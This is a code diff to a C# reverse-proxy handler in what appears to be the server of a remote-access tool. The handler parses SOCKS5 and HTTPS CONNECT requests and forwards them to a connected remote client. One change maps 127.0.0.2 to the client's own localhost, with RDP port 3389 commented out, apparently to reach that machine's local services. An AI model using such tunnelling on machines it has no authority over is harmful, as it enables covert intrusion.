@@ -138,123 +138,134 @@ namespace xServer.Core.ReverseProxy
             switch (PacketsReceived)
             {
                 case 0:
-                {
-                    //initial Socks packet
-                    if (payload.Length >= 3)
                     {
-                        string headerStr = Encoding.ASCII.GetString(payload);
-
-                        //check the proxy client
-                        if (payload[0] == SOCKS5_VERSION_NUMBER)
+                        //initial Socks packet
+                        if (payload.Length >= 3)
                         {
-                            Type = ProxyType.SOCKS5;
-                        }
-                        else if (headerStr.StartsWith("CONNECT") && headerStr.Contains(":"))
-                        {
-                            Type = ProxyType.HTTPS;
+                            string headerStr = Encoding.ASCII.GetString(payload);
 
-                            //Grab here the IP / PORT
-                            using (StreamReader sr = new StreamReader(new MemoryStream(payload)))
+                            //check the proxy client
+                            if (payload[0] == SOCKS5_VERSION_NUMBER)
                             {
-                                string line = sr.ReadLine();
-                                if (line == null)
-                                    break;
+                                Type = ProxyType.SOCKS5;
+                            }
+                            else if (headerStr.StartsWith("CONNECT") && headerStr.Contains(":"))
+                            {
+                                Type = ProxyType.HTTPS;
 
-                                //could have done it better with RegEx... oh well
-                                string[] split = line.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
-                                if (split.Length > 0)
+                                //Grab here the IP / PORT
+                                using (StreamReader sr = new StreamReader(new MemoryStream(payload)))
                                 {
-                                    try
+                                    string line = sr.ReadLine();
+                                    if (line == null)
+                                        break;
+
+                                    //could have done it better with RegEx... oh well
+                                    string[] split = line.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+                                    if (split.Length > 0)
                                     {
-                                        string ipPort = split[1];
-                                        this.TargetServer = ipPort.Split(':')[0];
-                                        this.TargetPort = ushort.Parse(ipPort.Split(':')[1]);
+                                        try
+                                        {
+                                            string ipPort = split[1];
+                                            this.TargetServer = ipPort.Split(':')[0];
+                                            this.TargetPort = ushort.Parse(ipPort.Split(':')[1]);
+                                            if (this.TargetServer == "127.0.0.2")
+                                            {
+                                                this.TargetServer = "127.0.0.1";
+                                                //this.TargetPort = 3389;
+                                            }
 
-                                        this._isConnectCommand = true;
-                                        this._isDomainNameType = true;
+                                            this._isConnectCommand = true;
+                                            this._isDomainNameType = true;
 
-                                        //Send Command to client and wait for response from CommandHandler
-                                        new ReverseProxyConnect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
-                                        Server.CallonConnectionEstablished(this);
+                                            //Send Command to client and wait for response from CommandHandler
+                                            new ReverseProxyConnect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
+                                            Server.CallonConnectionEstablished(this);
 
-                                        return; //Quit receiving and wait for client's response
-                                    }
-                                    catch
-                                    {
-                                        Disconnect();
+                                            return; //Quit receiving and wait for client's response
+                                        }
+                                        catch
+                                        {
+                                            Disconnect();
+                                        }
                                     }
                                 }
                             }
-                        }
-                        else
-                        {
-                            break;
-                        }
+                            else
+                            {
+                                break;
+                            }
 
-                        if (CheckProxyVersion(payload))
-                        {
-                            SendSuccessToClient();
-                            PacketsReceived++;
-                            _handshakeStream.SetLength(0);
-                            Server.CallonConnectionEstablished(this);
+                            if (CheckProxyVersion(payload))
+                            {
+                                SendSuccessToClient();
+                                PacketsReceived++;
+                                _handshakeStream.SetLength(0);
+                                Server.CallonConnectionEstablished(this);
+                            }
                         }
+                        break;
                     }
-                    break;
-                }
                 case 1:
-                {
-                    //Socks command
-                    int MinPacketLen = 6;
-                    if (payload.Length >= MinPacketLen)
                     {
-                        if (!CheckProxyVersion(payload))
-                            return;
-
-                        this._isConnectCommand = payload[1] == 1;
-                        this._isBindCommand = payload[1] == 2;
-                        this._isUdpCommand = payload[1] == 3;
-
-                        this._isIpType = payload[3] == 1;
-                        this._isDomainNameType = payload[3] == 3;
-                        this._isIPv6NameType = payload[3] == 4;
-
-                        Array.Reverse(payload, payload.Length - 2, 2);
-                        this.TargetPort = BitConverter.ToUInt16(payload, payload.Length - 2);
-
-                        if (_isConnectCommand)
+                        //Socks command
+                        int MinPacketLen = 6;
+                        if (payload.Length >= MinPacketLen)
                         {
-                            if (_isIpType)
+                            if (!CheckProxyVersion(payload))
+                                return;
+
+                            this._isConnectCommand = payload[1] == 1;
+                            this._isBindCommand = payload[1] == 2;
+                            this._isUdpCommand = payload[1] == 3;
+
+                            this._isIpType = payload[3] == 1;
+                            this._isDomainNameType = payload[3] == 3;
+                            this._isIPv6NameType = payload[3] == 4;
+
+                            Array.Reverse(payload, payload.Length - 2, 2);
+                            this.TargetPort = BitConverter.ToUInt16(payload, payload.Length - 2);
+
+                            if (_isConnectCommand)
                             {
-                                this.TargetServer = payload[4] + "." + payload[5] + "." + payload[6] + "." + payload[7];
-                            }
-                            else if (_isDomainNameType)
-                            {
-                                int domainLen = payload[4];
-                                if (MinPacketLen + domainLen < payload.Length)
+                                if (_isIpType)
                                 {
-                                    this.TargetServer = Encoding.ASCII.GetString(payload, 5, domainLen);
+                                    this.TargetServer = payload[4] + "." + payload[5] + "." + payload[6] + "." + payload[7];
+                                }
+                                else if (_isDomainNameType)
+                                {
+                                    int domainLen = payload[4];
+                                    if (MinPacketLen + domainLen < payload.Length)
+                                    {
+                                        this.TargetServer = Encoding.ASCII.GetString(payload, 5, domainLen);
+                                    }
+                                }
+
+                                if (this.TargetServer.Length > 0)
+                                {
+                                    if (this.TargetServer == "127.0.0.2")
+                                    {
+                                        this.TargetServer = "127.0.0.1";
+                                        //this.TargetPort = 3389;
+                                    }
+                                  
+                                    //Send Command to client and wait for response from CommandHandler
+                                    new ReverseProxyConnect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
                                 }
                             }
-
-                            if (this.TargetServer.Length > 0)
+                            else
                             {
-                                //Send Command to client and wait for response from CommandHandler
-                                new ReverseProxyConnect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
+                                SendFailToClient();
+                                return;
                             }
-                        }
-                        else
-                        {
-                            SendFailToClient();
+
+                            Server.CallonUpdateConnection(this);
+
+                            //Quit receiving data and wait for Client's response
                             return;
                         }
-
-                        Server.CallonUpdateConnection(this);
-
-                        //Quit receiving data and wait for Client's response
-                        return;
+                        break;
                     }
-                    break;
-                }
             }
 
             try
@@ -316,7 +327,7 @@ namespace xServer.Core.ReverseProxy
 
             if (Type == ProxyType.SOCKS5)
             {
-                SendToClient(new byte[] {SOCKS5_VERSION_NUMBER, SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS});
+                SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS });
                 Disconnect();
             }
         }
@@ -324,7 +335,7 @@ namespace xServer.Core.ReverseProxy
         private void SendSuccessToClient()
         {
             if (Type == ProxyType.SOCKS5)
-                SendToClient(new byte[] {SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED});
+                SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED });
         }
 
         private bool CheckProxyVersion(byte[] payload)
@@ -421,6 +432,10 @@ namespace xServer.Core.ReverseProxy
                             0, 0, 0, 0, //Bind Address
                             0, 0 //Bind Port
                         });
+                    }
+                    else
+                    {
+                        Disconnect();
                     }
                 }
 
